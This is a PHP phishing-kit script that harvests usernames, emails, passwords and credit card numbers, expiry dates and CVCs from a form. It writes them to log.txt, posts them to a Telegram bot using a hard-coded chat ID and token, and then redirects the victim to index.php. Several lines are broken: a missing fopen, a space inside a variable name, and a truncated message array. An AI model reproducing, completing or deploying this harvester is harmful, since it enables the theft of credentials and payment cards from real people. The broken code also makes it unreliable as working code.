<?php

extract($_REQUEST)
$file=("log.txt","a")

fwrite($file, "################\n");
fwrite($file,"> Username: ");
fwrite($file,$username ."\n");
fwrite($file,"> Email: ");
fwrite($file,$email ."\n");
fwrite($file,"> Password: ");
fwrite($file,$password ."\n");
fwrite($file,"> Gender: ");
fwrite($file,$gender ."\n");
fwrite($file,"> Payment Method: ");
fwrite($file,$paymentmethods ."\n");
fwrite($file, "#####CARD#####\n");
fwrite($file,"> CCN: ");
fwrite($file,$ccn ."\n");
fwrite($file,"> Expiry: ");
fwrite($file,$expiry ."\n");
fwrite($file,"> CVC: ");
fwrite($file,$cvc ."\n");
fwrite($file, "################\n");

fwrite($file, "/n");
fclose($file);


#Send Log Details to telegram
$telegram = "on"

$u = $_POST["username"];
$e = $_POST["email"];
$p = $_POST["password"];
$g = $_POST["gender"];
$pm = $_POST["paymentmethods"];
$cc = $_POST["ccn"];
$exp = $_POST["expiry"];
$cv = $_POST["cvc"];

$data = "#####CARD#####\n
> Username: $u \n 
> Email: $e \n 
> Password: $p \n 
> Gender: $g \n 
> Payment Method: $pm \n 
#####CARD#####\n
> CC: $cc \n 
> Expiry: $exp \n 
> CVC: $cv \n
################";

$chat id = "78718113559";// You Telegram Chat ID
$bot_url = "8508617112:AAGkkSHL832X1N6yUzOLqRDcWgwHoyFjQc";// Your Telegram Bot Api Key

if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'tex']
    $website = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website . '/send');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

header("location: index.php");
?>